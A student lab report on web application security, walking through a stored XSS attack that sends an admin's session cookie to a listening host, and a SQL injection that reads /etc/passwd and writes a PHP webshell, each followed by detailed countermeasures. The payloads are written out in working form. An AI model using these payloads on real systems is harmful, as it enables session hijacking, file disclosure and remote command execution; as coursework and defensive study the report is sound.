# Report - Lab 3 - Web Application Security
Group80: Yushu Hu, Ruijin Wang
## Part 1: Cross-Site Scripting (XSS)

### 1. Explored the UI and Find Vulnerabilities:  
   
- Click 'Admin' and try to login in this panel. There is no response and no information added.

  ![image-20250428114327300](./report_img/image-20250428114327300.png)

  ![image-20250428114657125](./report_img/image-20250428114657125.png)

- Click 'Welcome' and try to leave a comment. Enter `<script>alert(1)</script>` in the text field and submit then an alert box popped up.
  Also, if we enter `'"<>`, these non-encoded values also echoed back on the page. 
  Thus **a reflected XSS vulnerability** was discovered in the comment submission functionality. 
  The root cause of the issue is the lack of proper input sanitization and output encoding. The application directly reflects user-supplied input back into the webpage without escaping HTML special characters, which allows arbitrary JavaScript to be executed in the context of a victim's browser.
     

- Also, if we view the comment which contains our test XSS payload, alert box showed again.
  We thus found **a Stored XSS vulnerability**. That script got stored on the server, and when anyone views the post, it gets executed in their browser.
  So, if the admin views that page, we can run any code in their browser, here we are going to steal their cookie.


   ![image-20250428114758544](./report_img/image-20250428114758544.png)

### 2. Exploiting and Attacking by Session Hijacking
1. Run `ipconfig` to find the server ip:

   ![image-20250428114101990](report_img/image-20250428114101990.png)

2. Crafted a malicious payload that injected JavaScript to exfiltrate the session cookie: (key:document.cookie)

   ```html
   <script>location.href=http:'//192.168.5.20:80/index.php?test='+document.cookie;</script>
   ```
   Submitted this payload through the comment input field. Since the admin visits every page of the website every minute, 
   the script would execute in their browser, silently sending their session cookie to our controlled endpoint.

3. Captured the leaked cookie via `socat`:

   `socat TCP-LISTEN:80,reuseaddr,fork -`

   ![image-20250428115149526](report_img/image-20250428115149526.png)

4. Use browser's console to set the PHPSESSID cookie, granting us administrator-level access to the web application.

   ![image-20250428115531875](report_img/image-20250428115531875.png)

5. Login as an admin successfully:

   ![image-20250428115438367](report_img/image%202025-05-07%20225723.png)

### 3. Countermeasures (Defense-in-Depth)

#### Server-Side

1. Input Validation

   All user inputs should be treated as untrusted and must be encoded before being rendered to the browser. 
   Reject or transform malicious input before it reaches application logic. Using an allowlist of allowed patterns (e.g. strictly defined usernames, email formats) can help to prevent injection attacks.

   In this lab, the web form has no validation fields and attackers can inject `<script>` tags to trigger  XSS. To fix this, we can integrate a mature validation library in servercode and define precise regular expressions for each input field.

2. Output Sanitization

   Escape or remove unsafe or special characters in dynamic content, tailored to the output context (HTML, JavaScript, URL, etc.) Unsanitized names like `<script>alert(1)</script>` trigger reflected XSS.

   Adopt a templating engine that applies context‑aware escaping so that all interpolated variables are automatically sanitized for HTML contexts. For inline \<script\> contexts, wrap any dynamic data with a JavaScript string encoder, ensuring quotes and backslashes are escaped.

3. Domain Isolation 

   Serve all user‑uploaded or user‑generated content  from a completely separate domain or subdomain with no cookies shared. When an attacker uploads a file containing JavaScript that attempts to steal session cookies, the script cannot access the main application’s cookies if it’s on a separate domain.

   Set up a separate virtual host on the web server pointing user content to a static file directory. Because browsers enforce the same‑origin policy, scripts running on the user‑content domain cannot read cookies, local storage, or make privileged requests to main application.

#### Client-Side

1. HttpOnly Cookies

   Mark session and authentication cookies with the `HttpOnly` flag to prevent access via JavaScript. If a XSS vulnerability tries `alert(document.cookie)` with `HttpOnly`, `document.cookie` is empty.

   In application’s session‑management config , enable `cookie: { httpOnly: true }`.

2. CSP (Content Security Policy)

   - Script‑domain allowlisting: Only permit scripts from the domain and trusted CDNs.
   - Capability restrictions: Disallow all inline scripts.
   - Trusted Types: Force all DOM‑sink operations to accept only objects created via approved factory functions, eliminating accidental injection.

   Configure a Content Security Policy header with a strict set of rules to  only load any type of resource from our own domain. 

   ```sql
   Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.lab.local; object-src 'none'; base-uri 'self'; require-trusted-types-for 'script'; 
   ```

3. Iframe Sandboxing

   Embed untrusted third‑party or user content inside `<iframe>` elements with a restrictive `sandbox` attribute. Displaying an external widget or user‑generated HTML.

   In the lab page templates, wrap the user or third‑party content URL inside an iframe and add flags like `sandbox="allow-same-origin"`.

## Part 2: SQL Injection

### Attacking Steps

1. Check edit pages

   ![image-20250428163607100](report_img/image-20250428163607100.png)

   We can see the parameter is `id=1` , assume backend query would look like:

   ```sql
   SELECT * FROM posts WHERE id = 1
   ```
   The affected page was found: `edit.php` under the admin interface.

2. Find vulnerability

   Adding a single quote (`'`) tests whether the input is sanitized or directly embedded into the SQL query. 
   When we append `'` at the end of the URL parameter value for id, a mysql error displayed. 

   ![image-20250428173901230](report_img/image-20250428173901230.png)

   We can get the absolute path `/var/www` from the error message.

3. Determine the number of columns

   We append `UNION SELECT 1-- -` with increasing numbers of columns until the error stops.

   ![image-20250428182416908](report_img/image-20250428182416908.png)

   Finally the page loads without errors at `UNION SELECT 1,2,3,4` so the query has **4** columns .

4. Payload

   Add  `UNION SELECT 1,2,user(),4-- -` and then we know that we are root.

   ![image-20250428213858366](report_img/image-20250428213858366.png)

5. Confirm file access by reading `/etc/passwd` with the FILE privilege granted to the SQL user.

   `UNION SELECT 1,2,load_file("/etc/passwd"),4-- -`

   ![image-20250428214214497](report_img/image-20250428214214497.png)

6. Injecting a Webshell

   Since we have `/var/www` as an absolute path,  the user with `FILE` privilege can write here a PHP script which executes system commands via URL parameters.
   Enumerating directories and testing file creation via SQL `INTO OUTFILE`.  
   First we tried to write into `/classes` but failed:

   ```sql
   UNION SELECT 1,"<?php system($_GET['c']); ?>",3,4 INTO OUTFILE '/var/www/classes/shell.php'-- -
   ```

   ![image-20250428215455896](report_img/image-20250428215455896.png)

   Directories Tried and Failed:
   ```
   /var/www/
   
   /var/www/classes/
   ```
   Then we found a `/css` directory and tried to write into it. 
   ```sql
   UNION SELECT 1,"<?php system($_GET['c']); ?>",3,4 INTO OUTFILE '/var/www/css/shell.php'-- -
   ```

   We can see that a file has been created:  
   ![image-20250428220146981](report_img/image-20250428220146981.png)

   ![image-20250428220249246](report_img/image-20250428220249246.png)

   Since now we can create files on the server, we can use this to deploy a Web Shell.
   ```
   <?php system($_GET['c']); ?>
   ```
   The webshell is a minimal PHP script that runs any command passed via the `c` GET parameter.
   ![image-2025-05-07185603](report_img/image%202025-05-07%20185603.png)

### Discussions and Countermeasures (Defense-in-Depth)

#### Web application

- Insecure Query

  ```java
  String email = request.getParameter("email");
  String password = request.getParameter("password");
  String sql = "SELECT * FROM users WHERE email = '" 
               + email + "' AND password = '" 
               + password + "';";
  
  Statement stmt = connection.createStatement();
  ResultSet rs = stmt.executeQuery(sql);
  ```

  This concatenates user input directly into SQL, an attacker can supply `email = alice’ OR ’1’=’1` which transforms the WHERE clause into a tautology and returns every user row.

  We can change the sql into a fix format. The JDBC driver treats each `?` placeholder purely as a data slot, no matter what characters the user provides, they cannot change the SQL structure.

  ```java
  String sql = "SELECT * FROM users WHERE email = ? AND password = ?";
  ```

- Ensuring user input is treated as data in a query

  1. Input Validation by allow-list

     Define acceptable patterns , for example, email fields must match `/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/`.

  2. Use Parameterized API

     Rely exclusively on methods that accept parameter placeholders (e.g., `?` or named parameters) and then bind user inputs via dedicated setter functions.  Ensure that no user input can change the structure or intent of SQL statements.

#### Database system

- Least Privilege Principle  
  Run the application using a low-privileged database user without FILE privilege unless absolutely required.
   ```sql
   CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strongpassword';
   GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'webapp'@'localhost';
   ```
  Prevents access to `FILE, SUPER, or GRANT` which was used in this lab to leak `/etc/passwd` and drop webshells.
  

- Disable Dangerous Features  
  Set the following in MySQL configuration (my.cnf):
  ```
  secure_file_priv = "/tmp/"   # Restricts OUTFILE/INFILE to safe dir
  local_infile = 0             # Disables LOAD DATA LOCAL
  ```
  Prevents use of `INTO OUTFILE` to create malicious PHP shells.
  

- Database Auditing & Logging
  - Enable `general_log` and `slow_query_log` to monitor abnormal queries (e.g., UNION, OUTFILE). 
  - Use triggers or custom logic to log access to sensitive tables.


#### Operating system
1. User Context:
   1. Which user we are when we execute queries in the database  
      ```
      http://localhost:8080/admin/edit.php?id=0 UNION SELECT 1,user(),3,4--
      ```
      ![image-20250428213858366](report_img/image-20250428213858366.png)
      Determined via SQL `SELECT user()` and output `root@localhost`.
      This is the MySQL process user.  
     
   2. Which user we are at the OS level when we create the webshell (who is the owner?)  
      The file is written by the MySQL process.
      ```
      http://localhost:8080/css/z.php?c=ls%20-l%20/var/www/css/z.php
      ```
      Output:
      ``` 
      -rw-rw-rw- 1 mysql mysql 115 May 7 16:49 /var/www/css/z.php 
      ```
      ![image-2025-05-07 214455.png](report_img/image%202025-05-07%20214455.png)
      This means `mysql` is the owner, i.e., the SQL user created the file.   
      
   3. Which user we are when we execute commands in the webshell.  
      Webshell commands are executed by Apache/PHP.
      ```
      http://localhost:8080/css/z.php?c=whoami
      ```
      We get `www-data`.
      ![image-2025-05-07 185603.png](report_img/image%202025-05-07%20185603.png)
      This is the web server process user.    
     
  
2. Are these users the same?

   No. These users differ because OS-level privilege separation is essential. MySQL and Apache typically run under different system accounts for security:  
   `mysql` (DB process) vs. `www-data` (webserver process)  
   Process separation limits damage. If a SQL injection leads to file creation, it cannot be executed unless the webserver has access. This layering mitigates full compromise.
  

3. Which privileges and permission can be changed in the database and on the OS level to limit file access?   
**Database-level Hardening**  

   - Remove FILE privilege from DB user
        ```sql
        REVOKE FILE ON *.* FROM 'webuser'@'localhost';
        ```
        Prevents reading and writing arbitrary files from the DB.  
   
   - Restrict privileges   
     Grant only the minimal required access:
        ```sql
        GRANT SELECT, INSERT, UPDATE, DELETE ON appdb.* TO 'webuser'@'localhost';
        ```
   - Set `secure_file_priv`:
        ```
        [mysqld]
        secure_file_priv = /nonexistent/
        ```
        Ensures `INTO OUTFILE` and `LOAD_FILE()` are confined to a non-writable or non-existent directory. 
    

**Operating System-Level Hardening**
    
   - File Permissions  
      Ensure the database (`mysql`) and web server user (`www-data`) cannot write to sensitive or executable directories such as `/var/www/`:
       ```bash
        chown -R root:root /var/www/
        chmod -R 755 /var/www/
        ```
   - Disable write permissions to world/others  
     Prevent webshell creation by setting proper permissions:
     ```bash
     chmod o-w /css/
     ```
   - Isolation with AppArmor or SELinux
     Define strict access policies:  
     MySQL: Only allowed to write to specific logs, not web directory.  
     Apache: Restricted to executing only .php inside web root.



#### Security configuration
| Layer      | Configuration                                                          |
| ---------- |------------------------------------------------------------------------|
| MySQL      | `secure_file_priv = /nonexistent/`, `local_infile=0`                   |
| PHP        | `disable_functions = system,exec,shell_exec, passthru`, `open_basedir` |
| Apache     | Run as `www-data`, avoid write access to `htdocs/`                     |
| Filesystem | `chown root:www-data`, `chmod 755` on webroot                          |
